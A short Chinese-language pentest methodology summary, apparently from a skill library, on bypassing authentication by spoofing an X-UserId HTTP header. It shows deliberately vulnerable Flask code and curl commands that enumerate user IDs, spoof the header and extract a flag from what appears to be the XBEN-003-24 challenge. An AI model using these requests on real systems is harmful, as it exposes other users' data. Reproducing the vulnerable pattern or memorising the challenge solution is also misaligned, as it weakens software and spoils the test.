# X-UserId 头部认证绕过攻击方法论

> **注意：** 本文档的完整内容位于 `authentication-failures` 技能目录中。
> 
> 完整路径：`../authentication-failures/ref/x-userid-header-bypass-attack.md`

---

## 文档说明

本文档在 `broken-access-control` 技能中引用，用于指导渗透测试人员发现和利用因信任自定义 HTTP 头部导致的认证绕过和水平权限提升漏洞。

## 核心内容摘要

### 漏洞原理

X-UserId 头部认证绕过是指应用程序过度信任客户端提供的自定义 HTTP 头部（如 `X-UserId`），允许攻击者通过篡改该头部值绕过正常的会话认证机制，直接访问其他用户的数据或功能。

**本质问题**：
- 应用程序将客户端可控的 HTTP 头部作为身份验证依据
- 仅验证用户 ID 是否存在于数据库，未验证请求者是否有权访问该用户 ID
- 会话认证与头部认证并存时，头部优先级高于会话

### 典型漏洞代码

```python
# ❌ 危险代码示例
@app.route('/dashboard')
def dashboard():
    # 从会话获取用户 ID
    user_id = session.get('user_id')

    # 检查 X-UserId 头部
    x_user_id = request.headers.get('X-UserId')
    if x_user_id:
        # 仅验证用户是否存在，未验证权限
        if User.query.get(x_user_id):
            user_id = x_user_id  # 直接覆盖会话用户 ID
        else:
            return Response('Authentication Failed', status=400)

    # 获取用户数据（使用被覆盖的 user_id）
    user = User.query.get(user_id)
    return render_template('dashboard.html', user=user)
```

### 攻击场景

| 场景 | 描述 |
|-----|------|
| 水平权限绕过 | 访问其他用户的仪表板、个人资料 |
| 数据窃取 | 批量窃取所有用户数据 |
| 结合信息泄露 | 利用暴露的用户 ID 进行精确攻击 |

### 检测方法

```bash
# 1. 正常登录获取会话
curl -c cookies.txt -X POST http://target.com/password/test -d "password=test"

# 2. 测试 X-UserId 头部
curl -b cookies.txt http://target.com/dashboard -H "X-UserId: 10052"

# 如果返回用户 ID 10052 的数据，存在漏洞
```

### 完整利用流程

```bash
# 1. 枚举目标用户 ID
TARGET_ID=$(curl -s http://target.com/password/flag | grep -oP 'name="user_id" value="\K\d+')

# 2. 使用测试账户登录
curl -X POST http://target.com/ -d "username=test"
curl -c cookies.txt -X POST http://target.com/password/test -d "password=test"

# 3. 使用 X-UserId 头部访问目标用户
curl -b cookies.txt http://target.com/dashboard -H "X-UserId: $TARGET_ID"

# 4. 提取敏感数据
curl -b cookies.txt http://target.com/dashboard -H "X-UserId: $TARGET_ID" | grep -oP 'FLAG\{[^}]+\}'
```

## 完整文档

请查看完整文档获取详细的：
- 漏洞发现方法（黑盒/白盒测试）
- 自动化检测脚本
- 用户 ID 枚举技术
- 完整攻击脚本
- 修复建议

**完整文档路径：** `../authentication-failures/ref/x-userid-header-bypass-attack.md`

---

**参考来源：** XBEN-003-24 渗透测试实战
